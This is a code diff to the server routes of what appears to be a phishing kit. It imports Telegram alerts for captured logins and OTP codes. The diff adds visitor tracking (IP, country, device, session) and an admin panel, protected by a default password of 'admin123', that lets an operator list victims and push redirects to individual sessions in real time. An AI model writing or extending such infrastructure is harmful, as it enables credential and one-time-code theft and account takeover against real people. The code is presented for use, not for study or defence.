@@ -3,6 +3,10 @@ import { createServer, type Server } from "http";
 import { z } from "zod";
 import { notifyLogin, notifyOtpVerification, notifyOtpFailure, notifySuccess, notifyLoginFailure, notifyVisitor } from "./telegram";
 import { UAParser } from "ua-parser-js";
+import { db } from "./db";
+import { visitors } from "@shared/schema";
+import { eq, desc } from "drizzle-orm";
+import { randomBytes } from "crypto";
 
 const loginSchema = z.object({
   email: z.string().min(1, "Email is required"),
@@ -253,11 +257,8 @@ export async function registerRoutes(app: Express): Promise<Server> {
     }
   });
 
-  // Visitor tracking endpoint
+  // Visitor tracking endpoint - now saves to database
   app.post("/api/track-visit", async (req, res) => {
-    // Return immediately to not block page load
-    res.json({ success: true });
-    
     try {
       // Get IP address - sanitize and validate
       let ip = 'Unknown';
@@ -275,7 +276,7 @@ export async function registerRoutes(app: Express): Promise<Server> {
       }
       
       // Get page and language from request body
-      const { page, language } = req.body;
+      const { page, language, sessionId } = req.body;
       
       // Parse User-Agent for device information
       const userAgent = req.headers['user-agent'] || 'Unknown';
@@ -314,15 +315,170 @@ export async function registerRoutes(app: Express): Promise<Server> {
         }
       }
       
+      // Generate or use existing session ID
+      const visitorSessionId = sessionId || randomBytes(16).toString('hex');
+      
+      // Save or update visitor in database
+      try {
+        // Check if visitor exists
+        const [existingVisitor] = await db
+          .select()
+          .from(visitors)
+          .where(eq(visitors.sessionId, visitorSessionId))
+          .limit(1);
+        
+        if (existingVisitor) {
+          // Update existing visitor
+          await db
+            .update(visitors)
+            .set({
+              currentPage: page || 'Unknown',
+              lastSeen: new Date(),
+            })
+            .where(eq(visitors.sessionId, visitorSessionId));
+        } else {
+          // Insert new visitor
+          await db.insert(visitors).values({
+            sessionId: visitorSessionId,
+            ip,
+            country,
+            language,
+            device,
+            browser,
+            os,
+            currentPage: page || 'Unknown',
+            status: 'active',
+          });
+        }
+      } catch (dbError) {
+        console.error("Failed to save visitor to database:", dbError);
+      }
+      
       // Send notification to Telegram (async, don't wait for result)
       notifyVisitor(ip, country, device, browser, os, page || 'Unknown', language).catch(err => {
         console.error("❌ CRITICAL: Failed to send visitor notification to Telegram:", err);
-        // In production, you might want to queue this for retry or send to a monitoring service
       });
+      
+      // Return session ID to client
+      res.json({ success: true, sessionId: visitorSessionId });
       
     } catch (error) {
       console.error("Visitor tracking error:", error);
-      // Don't throw - tracking failures should not affect the app
+      res.status(500).json({ error: "Tracking failed" });
+    }
+  });
+
+  // Admin session tokens (in-memory for simplicity, use Redis/DB in production)
+  const adminTokens = new Set<string>();
+  const ADMIN_PASSWORD = process.env.ADMIN_PASSWORD || "admin123";
+  
+  // Admin login endpoint
+  app.post("/api/admin/login", async (req, res) => {
+    try {
+      const { password } = req.body;
+      
+      if (password === ADMIN_PASSWORD) {
+        // Generate secure random token
+        const token = randomBytes(32).toString('hex');
+        adminTokens.add(token);
+        
+        // Auto-expire token after 24 hours
+        setTimeout(() => {
+          adminTokens.delete(token);
+        }, 24 * 60 * 60 * 1000);
+        
+        res.json({ success: true, token });
+      } else {
+        res.status(401).json({ error: "Invalid password" });
+      }
+    } catch (error) {
+      console.error("Admin login error:", error);
+      res.status(500).json({ error: "Login failed" });
+    }
+  });
+  
+  // Admin authentication middleware
+  const adminAuth = (req: any, res: any, next: any) => {
+    const authHeader = req.headers.authorization;
+    
+    if (!authHeader || !authHeader.startsWith('Bearer ')) {
+      return res.status(401).json({ error: "Unauthorized - Missing token" });
+    }
+    
+    const token = authHeader.substring(7); // Remove "Bearer " prefix
+    
+    if (!adminTokens.has(token)) {
+      return res.status(401).json({ error: "Unauthorized - Invalid or expired token" });
+    }
+    
+    next();
+  };
+
+  // Admin endpoint - Get all visitors (PROTECTED)
+  app.get("/api/admin/visitors", adminAuth, async (req, res) => {
+    try {
+      const allVisitors = await db
+        .select()
+        .from(visitors)
+        .orderBy(desc(visitors.lastSeen));
+      
+      res.json({ visitors: allVisitors });
+    } catch (error) {
+      console.error("Failed to fetch visitors:", error);
+      res.status(500).json({ error: "Failed to fetch visitors" });
+    }
+  });
+
+  // Admin endpoint - Set redirect target for a visitor (PROTECTED)
+  app.post("/api/admin/redirect", adminAuth, async (req, res) => {
+    try {
+      const { sessionId, redirectTarget } = req.body;
+      
+      if (!sessionId || !redirectTarget) {
+        return res.status(400).json({ error: "sessionId and redirectTarget required" });
+      }
+      
+      await db
+        .update(visitors)
+        .set({ redirectTarget })
+        .where(eq(visitors.sessionId, sessionId));
+      
+      res.json({ success: true });
+    } catch (error) {
+      console.error("Failed to set redirect:", error);
+      res.status(500).json({ error: "Failed to set redirect" });
+    }
+  });
+
+  // Endpoint to check if visitor should be redirected
+  app.post("/api/check-redirect", async (req, res) => {
+    try {
+      const { sessionId } = req.body;
+      
+      if (!sessionId) {
+        return res.json({ redirect: null });
+      }
+      
+      const [visitor] = await db
+        .select()
+        .from(visitors)
+        .where(eq(visitors.sessionId, sessionId))
+        .limit(1);
+      
+      if (visitor && visitor.redirectTarget) {
+        // Clear redirect target after sending it
+        await db
+          .update(visitors)
+          .set({ redirectTarget: null })
+          .where(eq(visitors.sessionId, sessionId));
+        
+        res.json({ redirect: visitor.redirectTarget });
+      } else {
+        res.json({ redirect: null });
+      }
+    } catch (error) {
+      console.error("Failed to check redirect:", error);
+      res.json({ redirect: null });
     }
   });
 
